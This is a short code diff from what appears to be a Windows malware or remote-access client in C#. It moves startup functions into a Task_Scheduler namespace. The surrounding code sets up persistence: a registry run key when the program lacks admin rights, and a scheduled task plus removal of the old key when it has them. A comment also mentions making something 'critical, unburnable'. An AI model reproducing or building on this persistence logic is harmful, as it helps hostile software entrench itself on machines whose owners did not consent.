@@ -46,7 +46,7 @@ namespace Client
                 // else...do nothing ;(
 
                 // add startup to registry...for the meantime
-                Armitage.Startup.ViaRegistry();
+                Armitage.Startup.Task_Scheduler.ViaRegistry();
             }
             else // it is admin!
             {
@@ -65,16 +65,16 @@ namespace Client
                     // if not just go along.
 
                     // always creates the taskscheduler task, replace if exists
-                    Armitage.Startup.ViaTaskScheduler(Constants.WinDirTaskName);
+                    Armitage.Startup.Task_Scheduler.ViaTaskScheduler(Constants.WinDirTaskName);
 
                     // needs to be a separate if to get called after creating the task
-                    if (Armitage.Startup.IsTaskExists(Constants.WinDirTaskName))
+                    if (Armitage.Startup.Task_Scheduler.IsTaskExists(Constants.WinDirTaskName))
                     {
                         // if the task has been successfully added check if the old
                         // registry startup still exists
-                        if (Armitage.Startup.IsOldStartupExist())
+                        if (Armitage.Startup.Task_Scheduler.IsOldStartupExist())
                             // if it does, remove it
-                            Armitage.Startup.RemoveOldRegistryStartupKey();
+                            Armitage.Startup.Task_Scheduler.RemoveOldRegistryStartupKey();
                     }
                     // everything is set
                     // set the letter to be critical, unburnable
